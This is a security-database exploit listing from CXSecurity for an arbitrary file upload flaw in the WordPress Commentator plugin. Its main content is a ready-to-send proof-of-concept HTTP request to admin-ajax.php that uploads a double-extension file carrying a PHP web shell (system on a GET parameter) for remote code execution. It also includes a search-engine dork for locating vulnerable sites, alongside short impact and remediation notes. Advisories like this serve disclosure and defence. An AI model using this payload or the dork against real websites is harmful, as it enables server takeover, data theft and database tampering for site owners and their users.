---
title: WordPress Commentator Plugin - Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2026020015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-14
fetch_date: 2026-02-15T04:14:45.790778
---

# WordPress Commentator Plugin - Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Commentator Plugin - Arbitrary File Upload**  **2026.02.14**  Credit:  **[UnM@SK](https://cxsecurity.com/author/UnM%40SK/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "Click to see CWE-434")**  **[**Dork:** https://fofa.info/result?qbase64=d3AtY29udGVudC9wbHVnaW5zL2NvbW1lbnRhdG9yLw%3D%3D](https://cxsecurity.com/dorks/)** | |

################################################################################
# Exploit Title: WordPress Commentator Plugin - Arbitrary File Upload
# Date: 2026-02-05
# Exploit Author: Ahmad
# Category: Webapps
# Vulnerability Type: [CWE-434] Unrestricted Upload of File with Dangerous Type
################################################################################
[+] Description:
The "Commentator" plugin for WordPress contains an arbitrary file upload
vulnerability via the 'commentator\_upload-image' action in admin-ajax.php.
An attacker can bypass extension filters using double extensions (e.g., .php.jpg)
to upload malicious scripts and achieve Remote Code Execution (RCE).
[+] Proof of Concept (PoC):
POST /wp-admin/admin-ajax.php HTTP/2
Host: TARGET\_HOST
Content-Type: multipart/form-data; boundary=---------------------------219582655323612
-----------------------------219582655323612
Content-Disposition: form-data; name="action"
commentator\_upload-image
-----------------------------219582655323612
Content-Disposition: form-data; name="upl"; filename="shell.php.jpg"
Content-Type: image/jpeg
<?php system($\_GET['cmd']); ?>
-----------------------------219582655323612--
[+] Impact:
An attacker can gain full control over the web server, access sensitive data,
and modify the database by executing arbitrary commands.
[+] Recommendations:
- Implement strict file extension whitelisting.
- Rename uploaded files automatically on the server side.
- Disable script execution in the upload directory.
-thnks to
-IdiotCrew - L4663R666H05T
################################################################################

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top